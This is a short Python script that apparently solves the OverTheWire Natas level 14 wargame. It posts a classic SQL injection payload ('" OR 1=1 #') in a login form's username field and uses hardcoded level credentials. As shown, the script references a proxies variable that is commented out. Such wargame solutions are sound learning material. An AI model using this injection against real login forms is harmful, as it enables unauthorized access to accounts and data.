  
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re

#proxies = {
# "http": "http://127.0.0.1:8080",
#}
username = 'natas14'
password = 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'

url = 'http://%s.natas.labs.overthewire.org/?debug=true' % username

session = requests.Session()
# response = session.get(url, auth = (username, password) )
response = session.post(url, data = { "username" : 'please" OR 1=1 #', "password" : "subscribe"}, auth = (username, password), proxies=proxies )

content = response.text

print(content)
